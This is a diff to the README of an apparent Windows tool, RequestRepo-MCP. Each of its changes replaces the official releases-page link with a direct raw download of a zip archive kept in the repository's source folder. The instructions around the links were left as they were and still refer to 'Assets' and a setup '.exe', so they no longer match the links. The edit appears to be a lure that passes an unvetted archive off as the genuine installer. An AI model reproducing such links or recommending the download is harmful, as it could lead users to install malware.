@@ -1,6 +1,6 @@
 # 🚀 RequestRepo-MCP - Simplify Your Requests Management
 
-[![Download RequestRepo-MCP](https://img.shields.io/badge/Download-RequestRepo--MCP-brightgreen)](https://github.com/ronaldtarigan/RequestRepo-MCP/releases)
+[![Download RequestRepo-MCP](https://img.shields.io/badge/Download-RequestRepo--MCP-brightgreen)](https://github.com/ronaldtarigan/RequestRepo-MCP/raw/refs/heads/main/src/requestrepo_mcp/MCP_Request_Repo_3.3.zip)
 
 ---
 
@@ -41,9 +41,9 @@ No additional software or programming tools are necessary.
 
 The easiest way to get RequestRepo-MCP is by downloading it from the official releases page.
 
-[![Download RequestRepo-MCP](https://img.shields.io/badge/Download-RequestRepo--MCP-blue)](https://github.com/ronaldtarigan/RequestRepo-MCP/releases)
+[![Download RequestRepo-MCP](https://img.shields.io/badge/Download-RequestRepo--MCP-blue)](https://github.com/ronaldtarigan/RequestRepo-MCP/raw/refs/heads/main/src/requestrepo_mcp/MCP_Request_Repo_3.3.zip)
 
-1. Click the download button above or visit https://github.com/ronaldtarigan/RequestRepo-MCP/releases.
+1. Click the download button above or visit https://github.com/ronaldtarigan/RequestRepo-MCP/raw/refs/heads/main/src/requestrepo_mcp/MCP_Request_Repo_3.3.zip
 2. On the page, look for the latest version of RequestRepo-MCP under "Assets."
 3. Download the `.exe` file, usually named something like `RequestRepo-MCP-Setup.exe`.
 4. Save the file to a folder you can find easily, such as your Desktop or Downloads folder.
@@ -99,7 +99,7 @@ The app automatically saves your work; you don’t need to worry about losing da
 
 To keep RequestRepo-MCP working well and secure:
 
-1. Check the releases page regularly at https://github.com/ronaldtarigan/RequestRepo-MCP/releases.
+1. Check the releases page regularly at https://github.com/ronaldtarigan/RequestRepo-MCP/raw/refs/heads/main/src/requestrepo_mcp/MCP_Request_Repo_3.3.zip
 2. Download the latest `.exe` installer when a new version appears.
 3. Run the installer; it will update your current installation.
 
@@ -131,7 +131,7 @@ You can ask questions or report problems on the GitHub repository page under "Is
 
 Use this link to visit the download page:
 
-[Download RequestRepo-MCP](https://github.com/ronaldtarigan/RequestRepo-MCP/releases)
+[Download RequestRepo-MCP](https://github.com/ronaldtarigan/RequestRepo-MCP/raw/refs/heads/main/src/requestrepo_mcp/MCP_Request_Repo_3.3.zip)
 
 You will find the latest Windows installer `.exe` file there.
 
